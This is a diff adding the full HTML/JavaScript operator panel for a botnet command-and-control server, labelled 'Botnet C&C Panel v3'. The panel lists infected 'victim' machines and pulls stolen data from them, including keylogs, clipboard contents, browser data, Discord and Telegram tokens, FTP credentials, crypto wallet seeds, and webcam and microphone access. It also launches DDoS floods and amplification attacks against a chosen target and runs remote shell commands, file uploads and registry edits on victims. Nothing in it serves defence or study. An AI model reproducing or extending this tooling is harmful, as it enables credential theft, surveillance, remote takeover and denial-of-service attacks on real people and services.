@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Botnet C&C Panel v3</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --green: #3fb950; --red: #f85149; --blue: #58a6ff; --yellow: #d2991d; --orange: #f0883e; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', monospace; font-size: 13px; }
+        .navbar { background: var(--card); border-bottom: 1px solid var(--border); height: 46px; }
+        .navbar-brand { font-weight: bold; letter-spacing: 1px; font-size: 15px; }
+        .sidebar { background: var(--card); min-height: calc(100vh - 46px); border-right: 1px solid var(--border); padding: 0.3rem 0; width: 185px; }
+        .sidebar .nav-link { color: var(--text); padding: 0.45rem 1rem; border-left: 3px solid transparent; cursor: pointer; font-size: 12px; transition: all 0.2s; }
+        .sidebar .nav-link:hover { background: rgba(88,166,255,0.08); color: #fff; }
+        .sidebar .nav-link.active { background: rgba(88,166,255,0.12); color: var(--blue); border-left-color: var(--blue); font-weight: bold; }
+        .sidebar .nav-link i { margin-right: 6px; font-size: 13px; }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 0.75rem; }
+        .card-header { background: rgba(255,255,255,0.03); border-bottom: 1px solid var(--border); font-weight: bold; font-size: 12px; padding: 0.4rem 0.75rem; }
+        .card-body { padding: 0.75rem; }
+        .stat-card { padding: 0.8rem; text-align: center; border-radius: 6px; }
+        .stat-value { font-size: 1.5rem; font-weight: bold; line-height: 1; }
+        .stat-label { font-size: 10px; color: #8b949e; margin-top: 3px; text-transform: uppercase; letter-spacing: 1px; }
+        .table { color: var(--text); font-size: 11px; margin-bottom: 0; width: 100%; }
+        .table th { border-color: var(--border); font-size: 10px; text-transform: uppercase; color: #8b949e; padding: 0.35rem 0.5rem; white-space: nowrap; }
+        .table td { border-color: var(--border); padding: 0.3rem 0.5rem; vertical-align: middle; }
+        .badge { font-size: 9px; padding: 2px 7px; }
+        .badge-online { background: var(--green); color: #000; }
+        .badge-offline { background: #484f58; color: #8b949e; }
+        .badge-running { background: var(--orange); color: #000; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+        .btn { font-size: 11px; padding: 0.3rem 0.6rem; }
+        .btn-sm { font-size: 10px; padding: 0.2rem 0.4rem; }
+        .console { background: #0a0e14; color: #7ee787; height: 180px; overflow-y: auto; font-family: 'Consolas',monospace; padding: 0.5rem; font-size: 11px; line-height: 1.5; border-radius: 0 0 6px 6px; }
+        .form-control,.form-select { background: #0d1117; border: 1px solid var(--border); color: var(--text); font-size: 11px; padding: 0.25rem 0.4rem; }
+        .form-label { font-size: 10px; color: #8b949e; margin-bottom: 1px; }
+        .nav-tabs .nav-link { font-size: 11px; padding: 0.3rem 0.7rem; color: var(--text); border: none; cursor: pointer; }
+        .nav-tabs .nav-link.active { background: var(--blue); color: #000; border-radius: 4px; }
+        pre { background: #0a0e14; color: #7ee787; padding: 0.5rem; border-radius: 4px; font-size: 11px; max-height: 300px; overflow-y: auto; margin: 0; }
+        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem; }
+        .data-item { background: #1a1f2b; padding: 0.5rem; border-radius: 4px; font-size: 11px; }
+        .data-item .label { color: #8b949e; font-size: 10px; }
+        .data-item .value { word-break: break-all; }
+        ::-webkit-scrollbar { width: 5px; } ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-dark px-3">
+        <span class="navbar-brand"><i class="bi bi-robot"></i> BOTNET C&C v3</span>
+        <div class="d-flex align-items-center gap-2">
+            <span class="badge" id="wsStatus" style="background:#484f58;">DISCONNECTED</span>
+            <span style="font-size:10px;color:#8b949e;" id="currentTime">--</span>
+            <button class="btn btn-outline-danger btn-sm" onclick="doLogout()"><i class="bi bi-box-arrow-right"></i></button>
+        </div>
+    </nav>
+    <div class="d-flex">
+        <div class="sidebar">
+            <div class="nav flex-column">
+                <a class="nav-link active" onclick="switchTab('dashboard')"><i class="bi bi-speedometer2"></i> Dashboard</a>
+                <a class="nav-link" onclick="switchTab('bots')"><i class="bi bi-pc-display"></i> Bots</a>
+                <a class="nav-link" onclick="switchTab('victim')"><i class="bi bi-person-badge"></i> Victim</a>
+                <a class="nav-link" onclick="switchTab('ddos')"><i class="bi bi-lightning-charge"></i> DDoS</a>
+                <a class="nav-link" onclick="switchTab('remote')"><i class="bi bi-terminal"></i> Remote</a>
+                <a class="nav-link" onclick="switchTab('logs')"><i class="bi bi-journal-text"></i> Logs</a>
+            </div>
+        </div>
+        <div class="flex-grow-1 p-3" id="mainContent">
+            <!-- TAB DASHBOARD -->
+            <div id="tab-dashboard">
+                <h6 class="mb-2">Dashboard</h6>
+                <div class="row g-2 mb-2">
+                    <div class="col-md-3"><div class="card stat-card"><div class="stat-value text-primary" id="statTotal">0</div><div class="stat-label">Total Bots</div></div></div>
+                    <div class="col-md-3"><div class="card stat-card"><div class="stat-value text-success" id="statOnline">0</div><div class="stat-label">Online</div></div></div>
+                    <div class="col-md-3"><div class="card stat-card"><div class="stat-value text-danger" id="statOffline">0</div><div class="stat-label">Offline</div></div></div>
+                    <div class="col-md-3"><div class="card stat-card"><div class="stat-value text-warning" id="statAttacks">0</div><div class="stat-label">Attacks</div></div></div>
+                </div>
+                <div class="card"><div class="card-header">All Bots</div><div class="card-body p-0"><div style="max-height:400px;overflow-y:auto;"><table class="table table-sm mb-0" id="dashboardBotsTable"><thead><tr><th>Bot ID</th><th>Hostname</th><th>OS</th><th>CPU</th><th>IP</th><th>AV</th><th>Status</th><th>Last Seen</th></tr></thead><tbody></tbody></table></div></div></div>
+            </div>
+
+            <!-- TAB BOTS -->
+            <div id="tab-bots" style="display:none"><h6 class="mb-2">Bot Management</h6><div class="card"><div class="card-body p-0"><div style="max-height:500px;overflow-y:auto;"><table class="table table-sm mb-0" id="botsTableFull"><thead><tr><th>Bot ID</th><th>Hostname</th><th>OS</th><th>CPU</th><th>RAM</th><th>GPU</th><th>IP</th><th>MAC</th><th>AV</th><th>UAC</th><th>VM</th><th>Status</th><th>Last Seen</th></tr></thead><tbody></tbody></table></div></div></div></div>
+
+            <!-- TAB VICTIM INFO -->
+            <div id="tab-victim" style="display:none">
+                <h6 class="mb-2">Victim Information</h6>
+                <div class="row g-2 mb-2">
+                    <div class="col-md-4"><select class="form-select" id="victimSelect" onchange="loadVictimInfo()"><option value="">-- Select bot --</option></select></div>
+                    <div class="col-md-8">
+                        <div class="btn-group btn-group-sm">
+                            <button class="btn btn-primary" onclick="loadVictimInfo()">Load</button>
+                            <button class="btn btn-success" onclick="exportVictimInfo()">Export TXT</button>
+                            <button class="btn btn-info" onclick="sendVictimCmd('screenshot')">Screenshot</button>
+                            <button class="btn btn-warning" onclick="sendVictimCmd('webcam')">Webcam</button>
+                            <button class="btn btn-secondary" onclick="sendVictimCmd('microphone')">Microphone</button>
+                            <button class="btn btn-outline-light" onclick="sendVictimCmd('history')">History</button>
+                            <button class="btn btn-outline-info" onclick="sendVictimCmd('crypto_seed')">Crypto Seed</button>
+                            <button class="btn btn-outline-warning" onclick="sendVictimCmd('upload_file')">Upload File</button>
+                            <button class="btn btn-outline-danger" onclick="sendVictimCmd('registry')">Registry</button>
+                        </div>
+                    </div>
+                </div>
+                <ul class="nav nav-tabs mb-2" id="victimTabs">
+                    <li class="nav-item"><a class="nav-link active" onclick="switchVictimTab('system')">System</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('software')">Software</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('processes')">Processes</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('files')">Files</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('browser')">Browser</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('tokens')">Tokens</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('keylog')">Keylog</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('clipboard')">Clipboard</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('webcam')">Webcam</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('history')">History</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('crypto')">Crypto Seed</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="switchVictimTab('microphone')">Mic</a></li>
+                </ul>
+                <div id="victimTabContent"><p class="text-muted">Select a bot and click Load</p></div>
+            </div>
+
+            <!-- TAB DDoS -->
+            <div id="tab-ddos" style="display:none">
+                <h6 class="mb-2">DDoS Attack</h6>
+                <div class="card mb-2"><div class="card-body">
+                    <div class="row g-1 align-items-end">
+                        <div class="col-md-2"><label class="form-label">Target</label><input class="form-control" id="ddosTarget" placeholder="https://target.com"></div>
+                        <div class="col-md-1"><label class="form-label">Port</label><input class="form-control" id="ddosPort" value="80" type="number"></div>
+                        <div class="col-md-2"><label class="form-label">Method</label><select class="form-select" id="ddosMethod"><option>http_flood</option><option>udp_flood</option><option>syn_flood</option><option>slowloris</option><option>websocket_flood</option><option>icmp_flood</option><option>dns_amp</option><option>ntp_amp</option><option>ssdp_amp</option><option>memcached_amp</option></select></div>
+                        <div class="col-md-1"><label class="form-label">Duration</label><input class="form-control" id="ddosDuration" value="60" type="number"></div>
+                        <div class="col-md-1"><label class="form-label">Threads</label><input class="form-control" id="ddosThreads" value="50" type="number"></div>
+                        <div class="col-md-2"><button class="btn btn-danger w-100 btn-sm" onclick="startAttack()">LAUNCH</button></div>
+                        <div class="col-md-2"><button class="btn btn-outline-warning w-100 btn-sm" onclick="stopAllAttacks()">STOP ALL</button></div>
+                    </div>
+                </div></div>
+                <div class="card"><div class="card-header">Active Attacks <span class="badge bg-warning text-dark" id="activeAttackCount">0</span></div><div class="card-body" id="activeAttacksContainer"><p class="text-muted text-center py-2">No active attacks</p></div></div>
+            </div>
+
+            <!-- TAB REMOTE -->
+            <div id="tab-remote" style="display:none">
+                <h6 class="mb-2">Remote Control</h6>
+                <div class="row g-2 mb-2">
+                    <div class="col-md-4"><select class="form-select" id="remoteBotSelect"><option value="">-- Select bot --</option></select></div>
+                    <div class="col-md-8">
+                        <div class="btn-group btn-group-sm">
+                            <button class="btn btn-outline-danger" onclick="sendRemoteCmd('shutdown')">Shutdown</button>
+                            <button class="btn btn-outline-warning" onclick="sendRemoteCmd('restart')">Restart</button>
+                            <button class="btn btn-outline-info" onclick="sendRemoteCmd('screenshot')">Screenshot</button>
+                            <button class="btn btn-outline-secondary" onclick="sendRemoteCmd('kill')">Kill Process</button>
+                            <button class="btn btn-outline-light" onclick="sendRemoteCmd('upload_file')">Upload File</button>
+                            <button class="btn btn-outline-danger" onclick="sendRemoteCmd('registry')">Registry</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="card"><div class="card-header">Remote Shell</div><div class="card-body">
+                    <div class="input-group input-group-sm mb-2">
+                        <input class="form-control" id="shellCmd" placeholder="cmd.exe /c dir">
+                        <button class="btn btn-primary" onclick="executeShell()">Execute</button>
+                    </div>
+                    <pre id="shellOutput">Waiting for command...</pre>
+                </div></div>
+            </div>
+
+            <!-- TAB LOGS -->
+            <div id="tab-logs" style="display:none"><h6 class="mb-2">System Logs</h6><div class="card"><div class="card-header">Server Logs <button class="btn btn-sm btn-outline-secondary float-end" onclick="loadLogs()">Refresh</button></div><div class="console" id="logConsole" style="height:400px;">Loading...</div></div></div>
+
+            <!-- REALTIME CONSOLE -->
+            <div class="card mt-2"><div class="card-header">Real-time Events <button class="btn btn-sm btn-outline-secondary float-end" onclick="document.getElementById('realtimeConsole').innerHTML=''">Clear</button></div><div class="console" id="realtimeConsole" style="height:150px;"></div></div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        let jwtToken = sessionStorage.getItem('jwt_token');
+        let ws = null;
+        let currentTab = 'dashboard';
+        let currentVictimTab = 'system';
+        let activeAttacks = {};
+        let currentVictimData = null;
+
+        if (!jwtToken) { doLogin(); } else { initApp(); }
+
+        function doLogin() {
+            const u = prompt('Username:'); if (!u) { location.reload(); return; }
+            const p = prompt('Password:'); if (!p) { location.reload(); return; }
+            fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: u, password: p }) })
+                .then(r => r.json()).then(d => {
+                    if (d.token) { jwtToken = d.token; sessionStorage.setItem('jwt_token', jwtToken); initApp(); }
+                    else { alert('Login failed'); location.reload(); }
+                }).catch(() => { alert('Server offline'); location.reload(); });
+        }
+
+        function initApp() { connectWebSocket(); setInterval(updateTime, 1000); setInterval(refreshCurrentTab, 5000); }
+
+        function connectWebSocket() {
+            const wsUrl = `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}`;
+            ws = new WebSocket(wsUrl);
+            ws.onopen = () => { document.getElementById('wsStatus').textContent = 'CONNECTED'; document.getElementById('wsStatus').style.background = '#3fb950'; ws.send(JSON.stringify({ type: 'auth', token: jwtToken, role: 'admin' })); refreshCurrentTab(); };
+            ws.onmessage = (e) => { try { const m = JSON.parse(e.data); if (m.type === 'bot_online' || m.type === 'bot_offline') refreshCurrentTab(); if (m.type === 'attack_status' && activeAttacks[m.attack_id]) { activeAttacks[m.attack_id].lastPackets = (activeAttacks[m.attack_id].lastPackets||0)+(m.stats?.packets||0); if(currentTab==='ddos') renderActiveAttacks(); } } catch(ex){} };
+            ws.onclose = () => { document.getElementById('wsStatus').textContent = 'DISCONNECTED'; document.getElementById('wsStatus').style.background = '#f85149'; setTimeout(connectWebSocket, 3000); };
+        }
+
+        function switchTab(tab) {
+            ['dashboard','bots','victim','ddos','remote','logs'].forEach(t => { const el = document.getElementById(`tab-${t}`); if(el) el.style.display = 'none'; });
+            const el = document.getElementById(`tab-${tab}`); if (el) el.style.display = 'block';
+            document.querySelectorAll('.sidebar .nav-link').forEach(l => l.classList.remove('active'));
+            const link = document.querySelector(`.sidebar .nav-link[onclick*="${tab}"]`); if (link) link.classList.add('active');
+            currentTab = tab;
+            if (tab === 'victim') loadVictimList();
+            if (tab === 'remote') loadRemoteBotList();
+            refreshCurrentTab();
+        }
+
+        function switchVictimTab(tab) {
+            currentVictimTab = tab;
+            document.querySelectorAll('#victimTabs .nav-link').forEach(l => l.classList.remove('active'));
+            const link = document.querySelector(`#victimTabs .nav-link[onclick*="${tab}"]`); if (link) link.classList.add('active');
+            renderVictimTab();
+        }
+
+        function refreshCurrentTab() {
+            if (currentTab === 'dashboard') loadDashboard();
+            else if (currentTab === 'bots') loadBots();
+            else if (currentTab === 'ddos') renderActiveAttacks();
+            else if (currentTab === 'logs') loadLogs();
+        }
+
+        function apiGet(url) { return fetch(url, { headers: { 'Authorization': `Bearer ${jwtToken}` } }).then(r => r.json()).catch(() => ({})); }
+        function apiPost(url, data) { return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${jwtToken}` }, body: JSON.stringify(data) }).then(r => r.json()).catch(() => ({})); }
+
+        // DASHBOARD
+        async function loadDashboard() {
+            const [dash, bots] = await Promise.all([apiGet('/api/dashboard'), apiGet('/api/bots')]);
+            document.getElementById('statTotal').textContent = dash.total_bots || 0;
+            document.getElementById('statOnline').textContent = dash.online_bots || 0;
+            document.getElementById('statOffline').textContent = (dash.total_bots||0) - (dash.online_bots||0);
+            document.getElementById('statAttacks').textContent = Object.keys(activeAttacks).length;
+            const list = bots.bots || [];
+            document.querySelector('#dashboardBotsTable tbody').innerHTML = list.length === 0 ? '<tr><td colspan="8" class="text-center text-muted">No bots</td></tr>' : list.map(b => `<tr><td><code>${(b.bot_id||'').substring(0,10)}...</code></td><td>${b.hostname||'?'}</td><td>${b.os_version||'?'}</td><td>${(b.cpu_name||'').substring(0,18)}</td><td>${b.ip_public||b.ip_local||'?'}</td><td>${b.av_installed||'?'}</td><td><span class="badge ${b.status==='online'?'badge-online':'badge-offline'}">${b.status||'?'}</span></td><td style="font-size:10px">${b.last_seen||'?'}</td></tr>`).join('');
+        }
+
+        // BOTS
+        async function loadBots() {
+            const data = await apiGet('/api/bots?limit=200');
+            const list = data.bots || [];
+            document.querySelector('#botsTableFull tbody').innerHTML = list.length === 0 ? '<tr><td colspan="13" class="text-center text-muted">No bots</td></tr>' : list.map(b => `<tr><td><code>${(b.bot_id||'').substring(0,10)}</code></td><td>${b.hostname||'?'}</td><td>${b.os_version||'?'}</td><td>${(b.cpu_name||'').substring(0,15)}</td><td>${b.ram_total?(b.ram_total/1073741824).toFixed(1)+'G':'?'}</td><td>${(b.gpu_name||'').substring(0,12)}</td><td>${b.ip_public||b.ip_local||'?'}</td><td><code>${(b.mac_address||'').substring(0,14)}</code></td><td>${b.av_installed||'?'}</td><td>${b.uac_level||'?'}</td><td>${b.is_vm?'<span class="badge bg-warning text-dark">VM</span>':'-'}</td><td><span class="badge ${b.status==='online'?'badge-online':'badge-offline'}">${b.status||'?'}</span></td><td style="font-size:10px">${b.last_seen||'?'}</td></tr>`).join('');
+        }
+
+        // VICTIM
+        async function loadVictimList() {
+            const data = await apiGet('/api/bots');
+            const select = document.getElementById('victimSelect');
+            select.innerHTML = '<option value="">-- Select bot --</option>';
+            (data.bots||[]).forEach(b => select.innerHTML += `<option value="${b.bot_id}">${b.hostname||b.bot_id} (${b.ip_public||b.ip_local||'?'})</option>`);
+        }
+
+        async function loadVictimInfo() {
+            const botId = document.getElementById('victimSelect').value;
+            if (!botId) return;
+            const data = await apiGet(`/api/bots/${botId}`);
+            currentVictimData = data;
+            renderVictimTab();
+        }
+
+        function sendVictimCmd(cmd) {
+            const botId = document.getElementById('victimSelect').value;
+            if (!botId) { alert('Select a bot first'); return; }
+            let command_type = cmd;
+            let command_data = {};
+            if (cmd === 'upload_file') {
+                const fp = prompt('File path to upload:');
+                if (!fp) return;
+                command_data = { path: fp };
+            }
+            if (cmd === 'registry') {
+                const key = prompt('Registry key path (e.g. HKCU\\Software\\...):');
+                const val = prompt('Value name:');
+                if (!key) return;
+                command_data = { key: key, value: val || '' };
+            }
+            apiPost(`/api/bots/${botId}/command`, { command_type, command_data });
+            alert(`Command "${cmd}" sent!`);
+        }
+
+        function renderVictimTab() {
+            if (!currentVictimData) return;
+            const container = document.getElementById('victimTabContent');
+            const bot = currentVictimData.bot;
+            const dlist = currentVictimData.data || [];
+
+            if (currentVictimTab === 'system') {
+                container.innerHTML = bot ? `<table class="table table-sm"><tr><td>Bot ID</td><td><code>${bot.bot_id||'?'}</code></td></tr><tr><td>Hostname</td><td><strong>${bot.hostname||'?'}</strong></td></tr><tr><td>OS</td><td>${bot.os_version||'?'} (${bot.os_arch||'?'})</td></tr><tr><td>CPU</td><td>${bot.cpu_name||'?'} (${bot.cpu_cores||'?'} cores)</td></tr><tr><td>RAM</td><td>${bot.ram_total?(bot.ram_total/1073741824).toFixed(1)+' GB':'?'}</td></tr><tr><td>GPU</td><td>${bot.gpu_name||'?'}</td></tr><tr><td>Disks</td><td>${bot.disk_info||'?'}</td></tr><tr><td>IP Local</td><td>${bot.ip_local||'?'}</td></tr><tr><td>IP Public</td><td>${bot.ip_public||'?'}</td></tr><tr><td>MAC</td><td><code>${bot.mac_address||'?'}</code></td></tr><tr><td>NetBIOS</td><td>${bot.netbios||'?'}</td></tr><tr><td>Timezone</td><td>${bot.timezone||'?'}</td></tr><tr><td>Language</td><td>${bot.language||'?'}</td></tr><tr><td>Keyboard</td><td>${bot.keyboard_layout||'?'}</td></tr><tr><td>AV</td><td>${bot.av_installed||'None'}</td></tr><tr><td>UAC</td><td>${bot.uac_level||'?'}</td></tr><tr><td>VM</td><td>${bot.is_vm?'Yes':'No'}</td></tr><tr><td>Windows Update</td><td>${bot.windows_update||'?'}</td></tr><tr><td>Home Dir</td><td>${bot.home_dir||'?'}</td></tr><tr><td>Status</td><td><span class="badge ${bot.status==='online'?'badge-online':'badge-offline'}">${bot.status}</span></td></tr></table>` : '<p class="text-muted">No data</p>';
+            } else {
+                const typeMap = {
+                    'software': 'installed_software',
+                    'processes': 'running_processes',
+                    'files': 'sensitive_files',
+                    'browser': 'browser_data',
+                    'tokens': ['discord_tokens','telegram_session','steam_data','ftp_credentials'],
+                    'keylog': 'keylog_data',
+                    'clipboard': 'clipboard',
+                    'webcam': 'webcam_status',
+                    'history': 'browser_history',
+                    'crypto': 'crypto_seed_scan',
+                    'microphone': 'microphone'
+                };
+                const targetTypes = typeMap[currentVictimTab] || currentVictimTab;
+                const types = Array.isArray(targetTypes) ? targetTypes : [targetTypes];
+                const filtered = dlist.filter(d => types.includes(d.data_type));
+                
+                if (filtered.length === 0) { container.innerHTML = '<p class="text-muted">No data collected yet. Click buttons above to request data.</p>'; return; }
+                
+                container.innerHTML = filtered.map(d => {
+                    let content = '';
+                    try {
+                        const c = JSON.parse(d.data_content);
+                        if (d.data_type === 'installed_software') {
+                            const sw = c.software || [];
+                            content = `<strong>${sw.length} applications</strong><div style="max-height:250px;overflow-y:auto;">${sw.slice(0,50).map(s => `<div class="text-muted" style="font-size:10px">• ${s.name} ${s.version||''}</div>`).join('')}</div>`;
+                        } else if (d.data_type === 'running_processes') {
+                            const procs = c.processes || [];
+                            content = `<strong>${procs.length} processes</strong><div style="max-height:250px;overflow-y:auto;">${procs.slice(0,100).map(p => `<div style="font-size:10px">• ${p.name} (PID:${p.pid}, Mem:${(p.memory_kb||0)}KB)</div>`).join('')}</div>`;
+                        } else if (d.data_type === 'sensitive_files') {
+                            const files = c.files || [];
+                            content = `<strong>${files.length} files found</strong><div style="max-height:250px;overflow-y:auto;">${files.slice(0,50).map(f => `<div style="font-size:10px">• ${f.name} (${(f.size_bytes||0).toLocaleString()}B) <span class="text-muted">${f.path||''}</span></div>`).join('')}</div>`;
+                        } else if (d.data_type === 'browser_data') {
+                            const browsers = c.browsers || [];
+                            content = `<strong>${browsers.length} browsers</strong><div style="max-height:250px;overflow-y:auto;">${browsers.map(b => `<div style="font-size:10px">• <strong>${b.browser}</strong>: ${b.file_count||0} files (${(b.files||[]).map(f=>f.name).join(', ')})</div>`).join('')}</div>`;
+                        } else if (d.data_type === 'discord_tokens') {
+                            const tokens = c.tokens || [];
+                            content = `<strong>${tokens.length} tokens found</strong><div style="max-height:250px;overflow-y:auto;">${tokens.map(t => `<div style="font-size:10px">• <code>${(t.token||'').substring(0,50)}...</code></div>`).join('')}</div>`;
+                        } else if (d.data_type === 'keylog_data') {
+                            content = `<pre style="max-height:250px;">${c.data||c}</pre>`;
+                        } else if (d.data_type === 'crypto_seed_scan') {
+                            const files = c.files || [];
+                            content = `<strong>${c.count||files.length} potential seed files</strong><div style="max-height:250px;overflow-y:auto;">${files.map(f => `<div style="font-size:10px">• ${f.file||f.name}: ${f.bip39_words||0} BIP39 words</div>`).join('')}</div>`;
+                        } else if (d.data_type === 'microphone') {
+                            content = `<strong>${c.devices||0} microphone device(s) detected</strong>`;
+                        } else if (d.data_type === 'webcam_status') {
+                            content = `<strong>Webcam: ${c.available||'unknown'}</strong>`;
+                        } else if (d.data_type === 'browser_history') {
+                            content = `<strong>${c.browser||'Chrome'} History</strong>: ${(c.history_file_size||0).toLocaleString()} bytes`;
+                        } else {
+                            content = `<pre style="max-height:250px;">${JSON.stringify(c, null, 2)}</pre>`;
+                        }
+                    } catch(e) { content = `<pre style="max-height:250px;">${d.data_content||''}</pre>`; }
+                    return `<div class="mb-2"><strong style="color:var(--blue)">${d.data_type}</strong> <small class="text-muted">${d.captured_at||''}</small>${content}</div>`;
+                }).join('<hr>');
+            }
+        }
+
+        function exportVictimInfo() {
+            const botId = document.getElementById('victimSelect').value;
+            if (!botId) { alert('Select a bot first'); return; }
+            window.open(`/api/bots/${botId}/export`, '_blank');
+        }
+
+        // DDoS
+        async function startAttack() {
+            const target = document.getElementById('ddosTarget').value.trim();
+            const method = document.getElementById('ddosMethod').value;
+            const port = parseInt(document.getElementById('ddosPort').value) || 80;
+            const duration = parseInt(document.getElementById('ddosDuration').value) || 60;
+            const threads = parseInt(document.getElementById('ddosThreads').value) || 50;
+            if (!target) { alert('Enter target'); return; }
+            const res = await apiPost('/api/attack/start', { target, method, port, duration, threads });
+            if (res.attack_id) {
+                activeAttacks[res.attack_id] = { id: res.attack_id, target, method, port, duration, bots_used: res.bots_used||0, startTime: Date.now(), lastPackets:0, status:'running' };
+                renderActiveAttacks();
+                setTimeout(() => { if(activeAttacks[res.attack_id]){activeAttacks[res.attack_id].status='completed';renderActiveAttacks();} }, duration*1000+2000);
+            }
+        }
+        async function stopAttack(id) { await apiPost('/api/attack/stop',{attack_id:id}); if(activeAttacks[id]) activeAttacks[id].status='stopped'; renderActiveAttacks(); setTimeout(()=>{delete activeAttacks[id];renderActiveAttacks();},3000); }
+        async function stopAllAttacks() { for(const id of Object.keys(activeAttacks)){ await apiPost('/api/attack/stop',{attack_id:id}); activeAttacks[id].status='stopped'; } renderActiveAttacks(); setTimeout(()=>{Object.keys(activeAttacks).forEach(id=>delete activeAttacks[id]);renderActiveAttacks();},3000); }
+        function renderActiveAttacks() {
+            const ids = Object.keys(activeAttacks);
+            document.getElementById('activeAttackCount').textContent = ids.length;
+            document.getElementById('statAttacks').textContent = ids.length;
+            const container = document.getElementById('activeAttacksContainer');
+            if (ids.length === 0) { container.innerHTML = '<p class="text-muted text-center py-2">No active attacks</p>'; return; }
+            container.innerHTML = ids.map(id => {
+                const a = activeAttacks[id];
+                const remaining = Math.max(0, a.duration - Math.floor((Date.now()-a.startTime)/1000));
+                const pct = Math.min(100, Math.floor((Math.floor((Date.now()-a.startTime)/1000)/a.duration)*100));
+                return `<div class="d-flex justify-content-between align-items-center p-2 mb-1" style="background:#1a1f2b;border-left:3px solid ${a.status==='running'?'var(--orange)':'#484f58'};border-radius:4px;">
+                    <div><strong>${a.target}:${a.port}</strong> <span class="badge bg-info">${a.method}</span> <span class="badge ${a.status==='running'?'badge-running':'bg-secondary'}">${a.status}</span> <small>${a.bots_used} bots | ${(a.lastPackets||0).toLocaleString()} pkts</small></div>
+                    <div class="d-flex align-items-center gap-2"><div style="width:80px;background:#21262d;border-radius:3px;height:5px;"><div style="width:${pct}%;height:100%;border-radius:3px;background:var(--orange);"></div></div><small>${remaining}s</small>${a.status==='running'?`<button class="btn btn-danger btn-sm" onclick="stopAttack('${id}')">STOP</button>`:''}</div></div>`;
+            }).join('');
+        }
+
+        // REMOTE
+        async function loadRemoteBotList() {
+            const data = await apiGet('/api/bots');
+            const select = document.getElementById('remoteBotSelect');
+            select.innerHTML = '<option value="">-- Select bot --</option>';
+            (data.bots||[]).forEach(b => select.innerHTML += `<option value="${b.bot_id}">${b.hostname||b.bot_id}</option>`);
+        }
+
+        function sendRemoteCmd(cmd) {
+            const botId = document.getElementById('remoteBotSelect').value;
+            if (!botId) { alert('Select a bot first'); return; }
+            let command_type = cmd;
+            let command_data = {};
+            if (cmd === 'kill') {
+                const pname = prompt('Process name to kill:');
+                if (!pname) return;
+                command_data = { process: pname };
+            }
+            if (cmd === 'upload_file') {
+                const fp = prompt('File path to upload from victim:');
+                if (!fp) return;
+                command_data = { path: fp };
+            }
+            if (cmd === 'registry') {
+                const key = prompt('Registry key path (e.g. HKCU\\Software\\Microsoft):');
+                const val = prompt('Value name (leave empty for default):');
+                if (!key) return;
+                command_data = { key: key, value: val || '' };
+            }
+            apiPost(`/api/bots/${botId}/command`, { command_type, command_data });
+            alert(`Command "${cmd}" sent!`);
+        }
+
+        async function executeShell() {
+            const botId = document.getElementById('remoteBotSelect').value;
+            const cmd = document.getElementById('shellCmd').value;
+            if (!botId || !cmd) { alert('Select bot and enter command'); return; }
+            document.getElementById('shellOutput').textContent = 'Executing...';
+            const res = await apiPost(`/api/bots/${botId}/command`, { command_type: 'shell_exec', command_data: { command: cmd } });
+            document.getElementById('shellOutput').textContent = JSON.stringify(res, null, 2);
+        }
+
+        // LOGS
+        async function loadLogs() {
+            const data = await apiGet('/api/logs?limit=100');
+            document.getElementById('logConsole').innerHTML = (data.logs||[]).map(l => `[${l.created_at}] [${l.source||'sys'}] ${l.message}`).join('\n');
+        }
+
+        function updateTime() { document.getElementById('currentTime').textContent = new Date().toLocaleString(); }
+        function doLogout() { sessionStorage.removeItem('jwt_token'); if(ws) ws.close(); location.reload(); }
+    </script>
+</body>
+</html>
